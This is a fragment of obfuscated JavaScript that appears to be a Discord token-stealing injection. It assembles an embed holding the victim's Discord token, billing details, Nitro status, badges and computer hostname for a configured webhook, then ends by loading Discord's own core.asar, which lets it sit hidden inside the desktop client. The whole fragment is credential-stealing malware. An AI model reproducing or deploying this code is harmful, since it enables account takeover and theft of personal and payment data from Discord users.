                    _0x1d5e16.id +
                    '/' +
                    _0x1d5e16.avatar
                  : 'https://cdn.discordapp.com/embed/avatars/0.png',
              },
              thumbnail: {
                url: _0x1d5e16.avatar
                  ? 'https://cdn.discordapp.com/avatars/' +
                    _0x1d5e16.id +
                    '/' +
                    _0x1d5e16.avatar
                  : 'https://cdn.discordapp.com/embed/avatars/0.png',
              },
              fields: [
                {
                  name: 'Nitro',
                  value: '' + getNitro(_0x1d5e16.premium_type),
                  inline: false,
                },
                {
                  name: 'Billing',
                  value: '' + _0x25dc85,
                  inline: true,
                },
                {
                  name: 'Badges',
                  value: '' + getBadges(_0x1d5e16.flags),
                  inline: false,
                },
                {
                  name: 'Token',
                  value: '```' + _0x2f94cc + '```',
                  inline: false,
                },
                {
                  name: 'Hostname',
                  value: '```' + os.hostname + '```',
                  inline: false,
                },
                {
                  name: 'Used webhook url',
                  value: '```' + config.webhook_link + '```',
                  inline: false,
                },
              ],
            }),
          ],
        }))
  }
}
module.exports = require('./core.asar')
